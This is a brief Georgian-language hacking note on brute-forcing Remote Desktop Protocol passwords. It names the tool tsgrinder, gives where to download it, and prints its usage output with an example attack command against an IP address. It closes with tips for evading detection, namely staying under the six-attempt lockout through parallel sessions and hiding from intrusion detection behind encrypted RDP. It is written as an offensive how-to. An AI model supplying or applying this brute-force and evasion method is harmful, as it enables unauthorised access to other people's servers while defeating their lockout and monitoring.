Remote Desktop Protocol (RDP, აგრეთე ცნობილი როგორც Microsoft Terminal Services).
პორტი: TCP პორტი 3389.

# პაროლის გატეხვა უხეში ძალით

## ვინდოუსში

RDP-ს პაროლის გასატეხად უნდა გამოიყენოთ პროგრამა tsgrinder.
მისი გადმოწერა: http://www.hammerofgod.com/download.aspx.

```
D:\tsgrinder> tsgrinder

tsgrinder version 2.03


Usage:

  tsgrinder [options] server

Options:

  -w dictionary file (default 'dict')
  -l 'leet' translation file
  -d domain name
  -u username (default 'administrator'
  -b banner flag
  -n number of simultaneous threads
  -D debug level (default 9, lower number is more output)


Example:

  tsgrinder -w words -l leet -d workgroup -u administrator -b -n 2 10.1.1.1
```


tsgrinder ორ ხერხს ხმარობს იმისთვის რომ პაროლის გატეხვის ცდილობა ვერ დაფიქსირდეს.
  * პაროლის გატეხვის მცდელობა ფიქსირდება მხოლოდ იმ შემთხვევაში თუ მომხმარე ექვს პაროლს სცდის და ექვსივე არასწორი გამოდგება. tsgrinder პარალელური სესიების მეშვეობიც სინჯავს 5 პარორლს, ამიტომ მცდელობაც ვერ ფიქსირდება.
  * ეს ხელსაწყო ოყენებს შიფრირებულ RDP კავშირს პაროლით აუთენთირების დროს, ამიტომაც IDS ვერ ადგენს რომ პაროლის გატეხვის პროცესი მიმდინარეობს.
